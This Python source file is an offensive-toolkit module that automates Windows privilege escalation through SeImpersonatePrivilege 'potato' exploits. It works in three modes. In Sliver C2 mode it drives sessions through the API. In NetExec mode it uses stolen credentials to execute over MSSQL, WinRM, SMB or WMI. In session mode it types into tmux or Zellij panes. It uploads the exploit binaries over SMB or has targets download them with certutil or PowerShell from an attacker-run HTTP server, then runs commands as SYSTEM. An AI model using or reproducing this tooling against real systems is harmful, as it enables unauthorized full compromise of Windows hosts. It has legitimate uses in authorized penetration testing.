"""
SeImpersonate Privilege Escalation Module
Leverages various "potato" exploits for Windows privilege escalation
Supports both tmux session mode and NetExec credential-based mode
"""

import os
import subprocess
import time
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class SeImpersonate(ModuleBase):
    """
    Privilege escalation using SeImpersonatePrivilege.
    Supports multiple potato exploits with automatic command formatting.

    Two modes:
    - session: Send commands to an existing Evil-WinRM tmux session
    - netexec: Auto upload via SMB and execute via MSSQL/WinRM
    """

    # Potato command formats - {cmd} is replaced with user's command
    POTATO_FORMATS = {
        "godpotato": {
            "binary": "GodPotato.exe",
            "format": '-cmd "{cmd}"',
            "description": "GodPotato - Works on Windows 8-11, Server 2012-2022",
            "example": "GodPotato.exe -cmd \"whoami\"",
        },
        "printspoofer": {
            "binary": "PrintSpoofer.exe",
            "format": '-c "{cmd}"',
            "description": "PrintSpoofer - Uses print spooler service",
            "example": "PrintSpoofer.exe -c \"whoami\"",
        },
        "sweetpotato": {
            "binary": "SweetPotato.exe",
            "format": '-p cmd.exe -a "/c {cmd}"',
            "description": "SweetPotato - Combines multiple techniques",
            "example": "SweetPotato.exe -p cmd.exe -a \"/c whoami\"",
        },
        "juicypotato": {
            "binary": "JuicyPotato.exe",
            "format": '-t * -p cmd.exe -a "/c {cmd}" -l {port}',
            "description": "JuicyPotato - Classic, works on older Windows",
            "example": "JuicyPotato.exe -t * -p cmd.exe -a \"/c whoami\" -l 1337",
            "needs_port": True,
        },
        "roguepotato": {
            "binary": "RoguePotato.exe",
            "format": '-r {rhost} -e "{cmd}"',
            "description": "RoguePotato - Requires attacker listener",
            "example": "RoguePotato.exe -r 10.10.14.1 -e \"whoami\"",
            "needs_rhost": True,
        },
    }

    def __init__(self):
        super().__init__()
        self.name = "seimpersonate"
        self.description = "Privilege escalation via SeImpersonatePrivilege (Potato exploits)"
        self.author = "UwU Toolkit"
        self.version = "2.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["privesc", "seimpersonate", "potato", "windows", "local"]
        self.references = [
            "https://jlajara.gitlab.io/Potatoes_Windows_Privesc",
            "https://github.com/BeichenDream/GodPotato",
            "https://github.com/itm4n/PrintSpoofer",
            "https://github.com/CCob/SweetPotato",
            "https://github.com/ohpe/juicy-potato",
            "https://github.com/antonioCoco/RoguePotato",
        ]

        # Mode selection
        self.register_option("MODE", "Execution mode: sliver (generate commands), netexec (credentials), or session (tmux)",
                           default="sliver", choices=["sliver", "netexec", "session"])

        # Potato selection
        self.register_option("POTATO", "Potato exploit to use",
                           default="godpotato",
                           choices=list(self.POTATO_FORMATS.keys()))

        # Command to execute
        self.register_option("EXECUTE", "Command to execute as SYSTEM", required=True)

        # NetExec mode options (uses globals)
        self.register_option("RHOSTS", "Target IP address", default="")
        self.register_option("USER", "Username for authentication", default="")
        self.register_option("PASS", "Password or NTLM hash", default="")
        self.register_option("DOMAIN", "Domain name", default="")
        self.register_option("EXEC_PROTOCOL", "Protocol for command execution",
                           default="mssql", choices=["mssql", "winrm", "smb", "wmi"])

        # Session mode options
        self.register_option("SESSION", "Tmux session/pane for Sliver or Evil-WinRM", default="")
        self.register_option("AUTO_EXEC", "Auto-execute through Sliver session (sliver mode)",
                           default="yes", choices=["yes", "no"])

        # Additional options for specific potatoes
        self.register_option("LPORT", "Local port for JuicyPotato", default="1337")
        self.register_option("LHOST", "Local host IP for RoguePotato", default="")

        # Upload options
        self.register_option("UPLOAD", "Upload potato before executing",
                           default="yes", choices=["yes", "no"])
        self.register_option("UPLOAD_METHOD", "Upload method: smb (admin share) or http (certutil download)",
                           default="http", choices=["smb", "http"])
        self.register_option("SRVHOST", "HTTP server IP for http upload method (your IP)", default="")
        self.register_option("SRVPORT", "HTTP server port", default="8080")
        self.register_option("REMOTE_PATH", "Remote path to upload potato",
                           default="C:\\Windows\\Temp")
        self.register_option("POTATO_PATH", "Local path to potato binary (auto-detect if empty)",
                           default="")

    def _find_potato_local(self, potato_name: str) -> str:
        """Find the potato binary on local system"""
        potato_info = self.POTATO_FORMATS.get(potato_name)
        if not potato_info:
            return ""

        binary_name = potato_info["binary"]

        # Check custom path first
        custom_path = self.get_option("POTATO_PATH")
        if custom_path and os.path.isfile(custom_path):
            return custom_path

        # Search paths
        search_paths = [
            "/opt/my-resources/tools/potatoes",
            "/opt/tools/potatoes",
            "/opt/tools",
            os.path.expanduser("~/.local/share/potatoes"),
        ]

        for base_path in search_paths:
            full_path = os.path.join(base_path, binary_name)
            if os.path.isfile(full_path):
                return full_path

        return ""

    def _build_command(self, potato_name: str, user_cmd: str, remote_path: str = "") -> str:
        """Build the full potato command with proper formatting"""
        potato_info = self.POTATO_FORMATS.get(potato_name)
        if not potato_info:
            return ""

        binary = potato_info["binary"]
        fmt = potato_info["format"]

        # Strip surrounding quotes from user command
        user_cmd = user_cmd.strip()
        if (user_cmd.startswith("'") and user_cmd.endswith("'")) or \
           (user_cmd.startswith('"') and user_cmd.endswith('"')):
            user_cmd = user_cmd[1:-1]

        # Replace placeholders
        cmd = fmt.replace("{cmd}", user_cmd)

        # Handle JuicyPotato port
        if potato_info.get("needs_port"):
            port = self.get_option("LPORT")
            cmd = cmd.replace("{port}", str(port))

        # Handle RoguePotato remote host
        if potato_info.get("needs_rhost"):
            lhost = self.get_option("LHOST")
            if not lhost:
                self.print_error("LHOST required for RoguePotato")
                return ""
            cmd = cmd.replace("{rhost}", lhost)

        # Build full path
        if remote_path:
            return f"{remote_path}\\{binary} {cmd}"
        return f".\\{binary} {cmd}"

    def _run_netexec(self, protocol: str, args: list) -> tuple:
        """Run NetExec command and return (returncode, stdout, stderr)"""
        nxc_path = find_tool("nxc") or find_tool("netexec") or find_tool("crackmapexec")
        if not nxc_path:
            # Try in exegol
            ret, stdout, stderr = self.run_in_exegol(f"nxc {protocol} {' '.join(args)}")
            return ret, stdout, stderr

        cmd = [nxc_path, protocol] + args
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)

    def _upload_via_smb(self, target: str, user: str, password: str, domain: str,
                        local_file: str, remote_file: str) -> bool:
        """Upload file via SMB using NetExec"""
        self.print_status(f"Uploading {os.path.basename(local_file)} via SMB...")

        # Convert Windows path to admin share path
        # C:\Windows\Temp\file.exe -> C$\Windows\Temp\file.exe
        if remote_file.startswith("C:"):
            share_path = remote_file.replace("C:", "C$", 1).replace("/", "\\")
        elif remote_file.startswith("c:"):
            share_path = remote_file.replace("c:", "C$", 1).replace("/", "\\")
        else:
            share_path = remote_file.replace("/", "\\")

        self.print_status(f"SMB share path: {share_path}")

        args = [target, "-u", user, "-p", password]
        if domain:
            args.extend(["-d", domain])
        args.extend(["--put-file", local_file, share_path])

        ret, stdout, stderr = self._run_netexec("smb", args)
        output = stdout + stderr

        # Debug output
        if output:
            for line in output.split('\n'):
                if line.strip():
                    self.print_status(f"  {line.strip()}")

        if "[+]" in output and ("Pwn3d" in output or "admin" in output.lower()):
            self.print_good("Upload successful!")
            return True
        elif "[-]" in output:
            self.print_error(f"Upload failed")
            return False
        else:
            # Assume success if no error
            self.print_good("Upload completed")
            return True

    def _upload_via_http(self, target: str, user: str, password: str, domain: str,
                         local_file: str, remote_file: str, exec_protocol: str) -> bool:
        """Upload file via HTTP using certutil (starts temp web server)"""
        import threading
        import http.server
        import socketserver

        srvhost = self.get_option("SRVHOST")
        srvport = int(self.get_option("SRVPORT"))

        if not srvhost:
            # Try to get from LHOST or tun0
            srvhost = self.get_option("LHOST")
            if not srvhost or srvhost == "tun0":
                # Try to resolve tun0
                try:
                    import socket
                    import fcntl
                    import struct
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    srvhost = socket.inet_ntoa(fcntl.ioctl(
                        s.fileno(), 0x8915,
                        struct.pack('256s', b'tun0')
                    )[20:24])
                except:
                    self.print_error("SRVHOST is required for HTTP upload method")
                    self.print_status("Set SRVHOST to your IP address")
                    return False

        binary_name = os.path.basename(local_file)
        binary_dir = os.path.dirname(local_file)

        self.print_status(f"Starting HTTP server on {srvhost}:{srvport}...")

        # Create a simple HTTP server in the potato directory
        class QuietHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=binary_dir, **kwargs)

            def log_message(self, format, *args):
                pass  # Suppress logging

        server = None
        server_thread = None

        try:
            server = socketserver.TCPServer(("0.0.0.0", srvport), QuietHandler)
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()

            self.print_good(f"HTTP server started")
            self.print_status(f"Serving: http://{srvhost}:{srvport}/{binary_name}")

            # Build certutil command
            certutil_cmd = f'certutil -urlcache -split -f http://{srvhost}:{srvport}/{binary_name} {remote_file}'
            self.print_status(f"Downloading via certutil...")
            self.print_status(f"Command: {certutil_cmd}")

            # Execute certutil via the chosen protocol
            ret, stdout, stderr = self._execute_via_protocol(
                exec_protocol, target, user, password, domain, certutil_cmd
            )

            output = stdout + stderr

            # Check for success
            if "CertUtil" in output and ("successfully" in output.lower() or "bytes" in output.lower()):
                self.print_good("Download successful!")
                return True
            elif "[-]" in output or "error" in output.lower():
                # Try PowerShell as fallback
                self.print_warning("certutil failed, trying PowerShell...")
                ps_cmd = f'powershell -c "iwr http://{srvhost}:{srvport}/{binary_name} -OutFile {remote_file}"'
                ret, stdout, stderr = self._execute_via_protocol(
                    exec_protocol, target, user, password, domain, ps_cmd
                )
                output = stdout + stderr
                if "[+]" in output and "executed" in output.lower():
                    self.print_good("PowerShell download completed")
                    return True
                else:
                    self.print_error("Download failed")
                    return False
            else:
                # Might have worked
                self.print_good("Download command executed")
                return True

        except OSError as e:
            if "Address already in use" in str(e):
                self.print_warning(f"Port {srvport} already in use - assuming server is already running")
                # Try the download anyway
                certutil_cmd = f'certutil -urlcache -split -f http://{srvhost}:{srvport}/{binary_name} {remote_file}'
                ret, stdout, stderr = self._execute_via_protocol(
                    exec_protocol, target, user, password, domain, certutil_cmd
                )
                return "[+]" in (stdout + stderr)
            else:
                self.print_error(f"Failed to start HTTP server: {e}")
                return False
        finally:
            if server:
                server.shutdown()

    def _execute_via_protocol(self, protocol: str, target: str, user: str, password: str,
                              domain: str, command: str) -> tuple:
        """Execute command via specified protocol"""
        self.print_status(f"Executing via {protocol.upper()}...")
        self.print_status(f"Command: {command}")

        args = [target, "-u", user, "-p", password]
        if domain:
            args.extend(["-d", domain])
        args.extend(["-x", command])

        ret, stdout, stderr = self._run_netexec(protocol, args)
        return ret, stdout, stderr

    def run(self) -> bool:
        mode = self.get_option("MODE")

        if mode == "sliver":
            return self._run_sliver_mode()
        elif mode == "netexec":
            return self._run_netexec_mode()
        else:
            return self._run_session_mode()

    def _detect_multiplexer(self) -> str:
        """Detect which terminal multiplexer is in use"""
        # Check for Zellij
        if os.environ.get("ZELLIJ"):
            return "zellij"
        # Check for tmux
        if os.environ.get("TMUX"):
            return "tmux"
        return ""

    def _find_sliver_pane(self) -> tuple:
        """Find a pane running sliver-client. Returns (multiplexer, pane_id)"""
        mux = self._detect_multiplexer()

        if mux == "zellij":
            # Zellij doesn't have easy pane introspection, return empty to use current
            return "zellij", ""

        if mux == "tmux":
            try:
                result = subprocess.run(
                    ["tmux", "list-panes", "-a", "-F", "#{session_name}:#{window_index}.#{pane_index} #{pane_current_command}"],
                    capture_output=True, text=True, timeout=5
                )
                for line in result.stdout.strip().split('\n'):
                    if line and 'sliver' in line.lower():
                        parts = line.split(' ', 1)
                        if parts:
                            return "tmux", parts[0]
            except:
                pass

        return "", ""

    def _send_to_pane(self, mux: str, pane_id: str, command: str, enter: bool = True) -> bool:
        """Send a command to a pane in the detected multiplexer"""
        try:
            if mux == "zellij":
                # Zellij: write to focused pane or specific pane
                if pane_id:
                    # Write to specific pane
                    subprocess.run(["zellij", "action", "write-chars", "--pane-id", pane_id, command], timeout=10)
                    if enter:
                        subprocess.run(["zellij", "action", "write", "--pane-id", pane_id, "10"], timeout=10)  # 10 = newline
                else:
                    # Write to current/focused pane - user should focus Sliver pane first
                    subprocess.run(["zellij", "action", "write-chars", command], timeout=10)
                    if enter:
                        subprocess.run(["zellij", "action", "write", "10"], timeout=10)
                return True

            elif mux == "tmux":
                cmd = ["tmux", "send-keys", "-t", pane_id, command]
                if enter:
                    cmd.append("Enter")
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                return result.returncode == 0

        except Exception as e:
            self.print_error(f"Failed to send command: {e}")
            return False
        return False

    def _get_sliver_config(self) -> str:
        """Get the first available Sliver operator config"""
        config_dir = os.path.expanduser("~/.sliver-client/configs")
        if os.path.isdir(config_dir):
            configs = [f for f in os.listdir(config_dir) if f.endswith('.cfg')]
            if configs:
                return os.path.join(config_dir, configs[0])
        return ""

    async def _run_sliver_api(self, local_potato: str, remote_path: str, binary_name: str, full_cmd: str) -> bool:
        """Execute attack via Sliver Python API"""
        try:
            from sliver import SliverClientConfig, SliverClient
        except ImportError:
            self.print_error("sliver-py not installed. Run: pip3 install sliver-py")
            return False

        config_path = self.get_option("SESSION") or self._get_sliver_config()
        if not config_path or not os.path.exists(config_path):
            self.print_error("No Sliver config found")
            self.print_status("Set SESSION to your config path or ensure ~/.sliver-client/configs/ has a .cfg file")
            return False

        self.print_status(f"Using Sliver config: {config_path}")

        try:
            # Connect to Sliver
            config = SliverClientConfig.parse_config_file(config_path)
            client = SliverClient(config)
            await client.connect()
            self.print_good("Connected to Sliver server")

            # Get sessions
            sessions = await client.sessions()
            if not sessions:
                self.print_error("No active Sliver sessions found")
                await client.close()
                return False

            # Show sessions and let user pick if multiple
            if len(sessions) > 1:
                self.print_status("Available sessions:")
                for i, sess in enumerate(sessions, 1):
                    self.print_line(f"  [{i}] {sess.Name} - {sess.RemoteAddress} ({sess.OS}/{sess.Arch})")
                self.print_line()
                # Use first session for now
                session = sessions[0]
                self.print_status(f"Using session: {session.Name}")
            else:
                session = sessions[0]
                self.print_good(f"Using session: {session.Name} ({session.RemoteAddress})")

            # Interact with session
            interact = await client.interact_session(session.ID)

            # Step 1: Upload potato
            self.print_line()
            self.print_status("Step 1: Uploading potato to target...")
            remote_file = f"{remote_path}\\{binary_name}"

            with open(local_potato, 'rb') as f:
                potato_data = f.read()

            upload_result = await interact.upload(remote_file, potato_data)
            self.print_good(f"Uploaded {binary_name} to {remote_file}")

            # Step 2: Execute potato
            self.print_line()
            self.print_status("Step 2: Executing potato...")
            self.print_status(f"Command: {full_cmd}")

            # Parse command into exe and args for sliver-py API
            # full_cmd is like: C:\Windows\Temp\GodPotato.exe -cmd "whoami"
            import shlex
            parts = full_cmd.split(' ', 1)
            exe_path = parts[0]
            exe_args = parts[1] if len(parts) > 1 else ""

            exec_result = await interact.execute(exe_path, [exe_args], output=True)

            # Show output
            self.print_line()
            if exec_result.Stdout:
                self.print_good("Output:")
                for line in exec_result.Stdout.decode('utf-8', errors='ignore').strip().split('\n'):
                    self.print_line(f"  {line}")

            if exec_result.Stderr:
                self.print_warning("Stderr:")
                for line in exec_result.Stderr.decode('utf-8', errors='ignore').strip().split('\n'):
                    self.print_line(f"  {line}")

            await client.close()

            # Check for success
            output = exec_result.Stdout.decode('utf-8', errors='ignore').lower() if exec_result.Stdout else ""
            if "nt authority\\system" in output:
                self.print_line()
                self.print_good("SUCCESS! Running as NT AUTHORITY\\SYSTEM")

            return True

        except Exception as e:
            self.print_error(f"Sliver API error: {e}")
            return False

    def _run_sliver_mode(self) -> bool:
        """Execute SeImpersonate attack through Sliver session"""
        import shutil
        import asyncio

        potato_name = self.get_option("POTATO").lower()
        user_cmd = self.get_option("EXECUTE")
        remote_path = self.get_option("REMOTE_PATH")
        auto_exec = self.get_option("AUTO_EXEC") == "yes"

        if potato_name not in self.POTATO_FORMATS:
            self.print_error(f"Unknown potato: {potato_name}")
            return False

        potato_info = self.POTATO_FORMATS[potato_name]
        binary_name = potato_info["binary"]

        # Find potato binary
        local_potato = self._find_potato_local(potato_name)
        if not local_potato:
            self.print_error(f"Potato binary not found: {binary_name}")
            self.print_status("Download potatoes with: potatoes download")
            self.print_status("Or set POTATO_PATH to your binary location")
            return False

        self.print_line()
        self.print_status(f"Mode: Sliver")
        self.print_status(f"Potato: {potato_name.upper()}")
        self.print_status(f"  {potato_info['description']}")
        self.print_status(f"Local binary: {local_potato}")
        self.print_line()

        # Build the execution command
        full_cmd = self._build_command(potato_name, user_cmd, remote_path)
        if not full_cmd:
            return False

        # Try Sliver API if auto_exec enabled
        if auto_exec:
            try:
                import sliver
                # Run async function
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    result = loop.run_until_complete(
                        self._run_sliver_api(local_potato, remote_path, binary_name, full_cmd)
                    )
                    if result:
                        return True
                finally:
                    loop.close()
            except ImportError:
                self.print_warning("sliver-py not available - showing manual commands")
            except Exception as e:
                self.print_warning(f"Sliver API failed: {e}")
                self.print_status("Falling back to manual commands")
            self.print_line()

        # Try to copy potato to WORKING_DIR for HTTP serving
        working_dir = None
        try:
            from core.config import Config
            cfg = Config()
            working_dir = cfg.get_working_dir()
        except:
            cfg = None
        if not working_dir:
            working_dir = os.getcwd()

        potato_serve_path = os.path.join(working_dir, binary_name)
        copied_to_working = False

        try:
            if not os.path.exists(potato_serve_path):
                shutil.copy2(local_potato, potato_serve_path)
                self.print_good(f"Copied {binary_name} to {working_dir}")
                copied_to_working = True
            else:
                self.print_status(f"{binary_name} already in {working_dir}")
                copied_to_working = True
        except Exception as e:
            self.print_warning(f"Could not copy to working dir: {e}")

        # Get LHOST for download URL
        lhost = self.get_option("LHOST") or self.get_option("SRVHOST") or ""
        if not lhost and cfg:
            try:
                lhost = cfg.get("LHOST", "") or ""
            except:
                pass

        self.print_line()
        self.print_good("Run these commands in your Sliver session:")
        self.print_line()
        self.print_line("=" * 60)

        # Option 1: Direct upload from Sliver
        self.print_line()
        self.print_status("\033[1mOption 1: Upload directly from Sliver\033[0m")
        self.print_line(f"  sliver > upload {local_potato} {remote_path}\\{binary_name}")
        self.print_line(f"  sliver > execute -o {full_cmd}")

        # Option 2: Download via HTTP (if gosh server running)
        if copied_to_working and lhost:
            srvport = self.get_option("SRVPORT") or "8000"
            self.print_line()
            self.print_status("\033[1mOption 2: Download via HTTP (start 'gosh' first)\033[0m")
            self.print_line(f"  sliver > shell")
            self.print_line(f"  > certutil -urlcache -split -f http://{lhost}:{srvport}/{binary_name} {remote_path}\\{binary_name}")
            self.print_line(f"  > exit")
            self.print_line(f"  sliver > execute -o {full_cmd}")
        elif copied_to_working:
            self.print_line()
            self.print_status("\033[1mOption 2: Download via HTTP\033[0m")
            self.print_warning("Set LHOST or SRVHOST to generate download command")
            self.print_line(f"  Start: gosh 8000")
            self.print_line(f"  Download: certutil -urlcache -split -f http://YOUR_IP:8000/{binary_name} {remote_path}\\{binary_name}")

        self.print_line()
        self.print_line("=" * 60)
        self.print_line()

        # Quick reference
        self.print_status("Quick reference - Execute command:")
        self.print_line(f"  {full_cmd}")

        return True

    def _run_netexec_mode(self) -> bool:
        """Run using NetExec for upload and execution"""
        potato_name = self.get_option("POTATO").lower()
        user_cmd = self.get_option("EXECUTE")
        target = self.get_option("RHOSTS")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        domain = self.get_option("DOMAIN")
        exec_protocol = self.get_option("EXEC_PROTOCOL")
        do_upload = self.get_option("UPLOAD") == "yes"
        remote_path = self.get_option("REMOTE_PATH")

        # Validate
        if not target:
            self.print_error("RHOSTS is required")
            return False
        if not user:
            self.print_error("USER is required")
            return False
        if not password:
            self.print_error("PASS is required")
            return False

        if potato_name not in self.POTATO_FORMATS:
            self.print_error(f"Unknown potato: {potato_name}")
            return False

        potato_info = self.POTATO_FORMATS[potato_name]

        self.print_line()
        self.print_status(f"Mode: NetExec (auto upload & execute)")
        self.print_status(f"Target: {target}")
        self.print_status(f"User: {domain}\\{user}" if domain else f"User: {user}")
        self.print_status(f"Potato: {potato_name.upper()}")
        self.print_status(f"  {potato_info['description']}")
        self.print_status(f"Execute Protocol: {exec_protocol.upper()}")
        self.print_line()

        # Find potato binary
        local_potato = self._find_potato_local(potato_name)
        if not local_potato:
            self.print_error(f"Potato binary not found: {potato_info['binary']}")
            self.print_status("Run: potatoes download")
            return False

        self.print_good(f"Found local potato: {local_potato}")

        binary_name = potato_info["binary"]
        remote_file = f"{remote_path}\\{binary_name}"
        upload_method = self.get_option("UPLOAD_METHOD")

        # Step 1: Upload potato
        if do_upload:
            self.print_line()
            upload_success = False

            if upload_method == "smb":
                self.print_status("Step 1: Uploading potato via SMB...")
                upload_success = self._upload_via_smb(target, user, password, domain, local_potato, remote_file)
            else:  # http
                self.print_status("Step 1: Uploading potato via HTTP (certutil)...")
                upload_success = self._upload_via_http(target, user, password, domain, local_potato, remote_file, exec_protocol)

            if not upload_success:
                self.print_warning("Upload may have failed - trying execution anyway")

        # Step 2: Build and execute command
        self.print_line()
        self.print_status("Step 2: Executing potato...")

        full_cmd = self._build_command(potato_name, user_cmd, remote_path)
        if not full_cmd:
            return False

        ret, stdout, stderr = self._execute_via_protocol(
            exec_protocol, target, user, password, domain, full_cmd
        )

        output = stdout + stderr

        # Display output
        self.print_line()
        if output:
            for line in output.split('\n'):
                line = line.strip()
                if not line:
                    continue
                if "[+]" in line:
                    self.print_good(line)
                elif "[-]" in line:
                    self.print_error(line)
                elif line.startswith("    "):
                    # Command output - highlight it
                    self.print_line(f"\033[92m>>>\033[0m {line.strip()}")
                else:
                    self.print_status(line)

        # Check for success
        if "nt authority\\system" in output.lower():
            self.print_line()
            self.print_good("SUCCESS! Running as NT AUTHORITY\\SYSTEM")
            return True
        elif "[+]" in output and "executed" in output.lower():
            self.print_line()
            self.print_good("Command executed - check output above")
            return True
        else:
            self.print_line()
            self.print_warning("Execution completed - verify output")
            return True

    def _run_session_mode(self) -> bool:
        """Run using tmux session (original mode)"""
        potato_name = self.get_option("POTATO").lower()
        user_cmd = self.get_option("EXECUTE")
        session_input = self.get_option("SESSION")
        do_upload = self.get_option("UPLOAD") == "yes"

        if not session_input:
            self.print_error("SESSION is required for session mode")
            self.print_status("Set MODE to 'netexec' to use credential-based execution")
            return False

        if potato_name not in self.POTATO_FORMATS:
            self.print_error(f"Unknown potato: {potato_name}")
            return False

        potato_info = self.POTATO_FORMATS[potato_name]

        # Resolve session
        session_name = self._resolve_session(session_input)
        if not session_name:
            self.print_error(f"Session not found: {session_input}")
            self.print_status("Available sessions:")
            for i, sess in enumerate(self._get_tmux_sessions(), 1):
                self.print_line(f"  [{i}] {sess}")
            return False

        self.print_status(f"Mode: Session (tmux)")
        self.print_status(f"Session: {session_name}")
        self.print_status(f"Potato: {potato_name.upper()}")
        self.print_status(f"  {potato_info['description']}")
        self.print_line()

        # Find potato - use relative path for evil-winrm
        local_potato = self._find_potato_local(potato_name)
        if not local_potato:
            self.print_error(f"Potato binary not found: {potato_info['binary']}")
            return False

        # For evil-winrm, use relative path
        if "/opt/my-resources/tools/" in local_potato:
            upload_path = f"../potatoes/{potato_info['binary']}"
        else:
            upload_path = local_potato

        self.print_good(f"Found potato: {local_potato}")

        # Build command
        full_cmd = self._build_command(potato_name, user_cmd)
        if not full_cmd:
            return False

        self.print_status(f"Command: {full_cmd}")
        self.print_line()

        # Upload if requested
        if do_upload:
            self.print_status("Step 1: Uploading potato...")
            upload_cmd = f"upload {upload_path}"
            self.print_status(f"Sending: {upload_cmd}")

            if not self._send_to_session(session_name, upload_cmd):
                self.print_error("Failed to send upload command")
                return False

            self.print_status("Waiting for upload...")
            time.sleep(5)

        # Execute
        self.print_status("Step 2: Executing potato...")
        self.print_status(f"Sending: {full_cmd}")

        if not self._send_to_session(session_name, full_cmd):
            self.print_error("Failed to send execute command")
            return False

        self.print_line()
        self.print_good("Potato executed!")
        self.print_status("Check your session for command output")

        return True

    def _get_tmux_sessions(self) -> list:
        """Get list of uwu tmux sessions"""
        try:
            result = subprocess.run(
                ["tmux", "list-sessions", "-F", "#{session_name}"],
                capture_output=True, text=True, timeout=5
            )
            sessions = []
            for line in result.stdout.strip().split('\n'):
                if line and line.startswith("uwu-"):
                    sessions.append(line)
            return sessions
        except:
            return []

    def _send_to_session(self, session_name: str, command: str, enter: bool = True) -> bool:
        """Send a command to a tmux session"""
        try:
            cmd = ["tmux", "send-keys", "-t", session_name, command]
            if enter:
                cmd.append("Enter")
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            return result.returncode == 0
        except Exception as e:
            self.print_error(f"Failed to send command: {e}")
            return False

    def _resolve_session(self, session_input: str) -> str:
        """Resolve session ID to actual session name"""
        sessions = self._get_tmux_sessions()

        try:
            idx = int(session_input)
            if 1 <= idx <= len(sessions):
                return sessions[idx - 1]
        except ValueError:
            pass

        if session_input in sessions:
            return session_input

        if f"uwu-{session_input}" in sessions:
            return f"uwu-{session_input}"

        return ""

    def check(self) -> bool:
        """Check if potatoes are available"""
        found = []
        for name in self.POTATO_FORMATS:
            if self._find_potato_local(name):
                found.append(name)

        if found:
            self.print_good(f"Available potatoes: {', '.join(found)}")
            return True
        else:
            self.print_warning("No potato binaries found")
            self.print_status("Run: potatoes download")
            return False

    def info(self) -> str:
        """Extended info showing potato options"""
        base_info = super().info()

        extra_info = [
            "",
            "Execution Modes:",
            "-" * 50,
            "  sliver   - Generate commands for Sliver C2 session (default)",
            "  netexec  - Auto upload via SMB, execute via MSSQL/WinRM/SMB",
            "  session  - Send commands to existing Evil-WinRM tmux session",
            "",
            "Available Potato Exploits:",
            "-" * 50,
        ]

        for name, info in self.POTATO_FORMATS.items():
            extra_info.append(f"  {name}:")
            extra_info.append(f"    {info['description']}")
            extra_info.append(f"    Example: {info['example']}")
            extra_info.append("")

        return base_info + "\n".join(extra_info)
